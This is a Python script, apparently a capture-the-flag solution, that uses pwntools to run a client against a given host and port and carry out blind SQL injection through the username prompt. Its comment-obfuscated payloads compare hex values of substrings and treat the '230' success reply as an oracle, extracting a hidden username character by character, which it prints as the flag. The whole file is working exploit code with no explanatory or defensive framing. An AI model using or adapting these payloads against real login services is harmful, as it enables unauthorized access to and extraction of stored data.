#!/usr/bin/env python

from pwn import process
import logging

import sys
import time

HOST = sys.argv[1]
logging.getLogger().disabled=True

PORT = sys.argv[2]
#print (HOST,PORT)
KEY="";
CHR=0x21;
rear_length = 0;

def tryDo(v1,v2):    
    PAYLOAD="\"or/**/hex('%c')<hex(substr((select/**/username/**/where/**/substr(password,1,1)='8'),%d,1))--" % (chr(v1),int(v2))
    p = process(["./client",HOST,PORT],level='error')
    p.recvuntil("username:");
    p.sendline(PAYLOAD)
    p.recvuntil("password:");
    p.sendline("DUMMY");
    RESULT = p.recv(timeout=3)
    p.close();
    if RESULT.find("230") >= 0:
        return chr(v1)
    else:
        return 0

def tryInc(v1,v2):    
    PAYLOAD="\"or/**/hex('%c')=hex(substr((select/**/username/**/where/**/substr(password,1,1)='8'),%d,1))--" % (chr(v1),int(v2))
    p = process(["./client",HOST,PORT],level='error')
    p.recvuntil("username:");
    p.sendline(PAYLOAD)
    p.recvuntil("password:");
    p.sendline("DUMMY");
    RESULT = p.recv(timeout=1)
    p.close();
    if RESULT.find("230") >= 0:
        return chr(v1)
    else:
        return 0

for i in range (1,11):
    if(tryDo(0x50,i)!=0):
        if(tryDo(0x60,i)!=0): #0x60, 0x7d
            if(tryDo(0x70,i)!=0):
                for CHR in range (0x71,0x7d+0x1) :
                    if tryInc(CHR,i)!=0:
                        KEY+=chr(CHR)
                        break
                        
            else:
                if(tryDo(0x68,i) != 0):
                    if(tryDo(0x6b,i) !=0):
                        for CHR in range (0x6c,0x70+0x1):
                            if tryInc(CHR,i)!=0:
                                KEY+=chr(CHR)
                                break
                    else:
                        for CHR in range (0x68,0x6b+0x1):
                            if tryInc(CHR,i)!=0:
                                KEY+=chr(CHR)
                                break
                else:
                    if(tryDo(0x64,i) != 0):
                        for CHR in range (0x65,0x68+0x1):
                            if tryInc(CHR,i)!=0:
                                KEY+=chr(CHR)
                                break
                    else:
                        for CHR in range (0x60,0x64+0x1):
                            if tryInc(CHR,i)!=0:
                                KEY+=chr(CHR)
                                break

        else:               #0x50, 0x60
            if(tryDo(0x58,i) !=0):
                for CHR in range (0x59,0x60+0x1) :
                    if tryInc(CHR,i)!=0:
                        KEY+=chr(CHR)
                        break
            else:
                for CHR in range (0x50,0x58+0x1):
                    if tryInc(CHR,i)!=0:
                        KEY+=chr(CHR)
                        break

    else:
        if(tryDo(0x40,i)!=0):
            if(tryDo(0x48,i)!=0):
                for CHR in range (0x49,0x50+0x1) :
                    if tryInc(CHR,i)!=0:
                        KEY+=chr(CHR)
                        break
            else:
                for CHR in range (0x40,0x48+0x1) :
                    if tryInc(CHR,i)!=0:
                        KEY+=chr(CHR)
                        break

        else:
            if(tryDo(0x38,i) != 0):
                for CHR in range (0x39,0x40+0x1) :
                    if tryInc(CHR,i)!=0 :
                        KEY+=chr(CHR)
                        break;
            else:
                for CHR in range (0x30,0x38+0x1) :
                    if tryInc(CHR,i)!=0 :
                        KEY+=chr(CHR)
                        break;

    #KEY=KEY.rstrip()

    #print ">>>" , KEY
 #   if rear_length >= len(KEY):
 #       break;
 #   else:
 #       rear_length = len(KEY);


flag = KEY
flag = flag.rstrip()
sys.stdout.write(flag)
